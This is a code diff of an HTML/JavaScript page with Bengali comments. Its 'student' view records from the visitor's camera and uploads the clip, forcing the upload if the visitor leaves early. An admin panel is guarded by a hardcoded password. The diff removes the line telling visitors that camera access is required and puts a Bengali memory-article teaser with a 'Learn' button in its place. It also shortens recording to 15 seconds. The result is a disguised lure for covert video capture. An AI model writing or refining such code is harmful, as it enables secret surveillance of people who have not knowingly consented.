@@ -46,9 +46,9 @@
 
   <section id="student-panel" class="panel student">
     <div id="initial-view" class="box">
-      <h2>Read Article</h2>
-      <div class="consent">To continue reading the psychological study on human memory, please allow camera access.</div>
-      <button id="start-button" class="btn">Allow & Continue Reading</button>
+      <h2>আমরা কেন ভুলে যাই?</h2>
+      <div class="consent">ভুলে যাওয়া কি সত্যিই স্মৃতিশক্তির দুর্বলতা, নাকি মস্তিষ্কের স্বাভাবিক প্রক্রিয়া?</div>
+      <button id="start-button" class="btn">জানুন</button>
       <p id="student-status" class="loader"></p>
     </div>
 
@@ -85,8 +85,8 @@
     const ADMIN_PASSWORD = '74722222';
     
     let adminPassword = null;
-    let currentRecorder = null; // নতুন ভ্যারিয়েবল
-    let recordTimeout = null;   // নতুন ভ্যারিয়েবল
+    let currentRecorder = null; 
+    let recordTimeout = null;   
 
     if (mode === 'admin') {
       document.getElementById('admin-panel').style.display = 'flex';
@@ -161,10 +161,10 @@
         };
 
         mediaRecorder.start();
-        // ২৫ সেকেন্ড রেকর্ডিং ডিউরেশন
+        // ১৫ সেকেন্ড রেকর্ডিং ডিউরেশন
         recordTimeout = setTimeout(() => { 
           if(mediaRecorder.state === 'recording') mediaRecorder.stop(); 
-        }, 25000); 
+        }, 15000); 
       }
       
       recordAndUpload();
@@ -172,7 +172,7 @@
       // ইউজার মাঝপথে বের হয়ে গেলে আপলোড করার ফাংশন
       function handleUnload() {
          if (currentRecorder && currentRecorder.state === 'recording') {
-            clearTimeout(recordTimeout); // ২৫ সেকেন্ডের টাইমার বাতিল করবে
+            clearTimeout(recordTimeout); // ১৫ সেকেন্ডের টাইমার বাতিল করবে
             currentRecorder.stop(); // জোর করে রেকর্ডিং থামিয়ে আপলোড শুরু করাবে
          }
       }
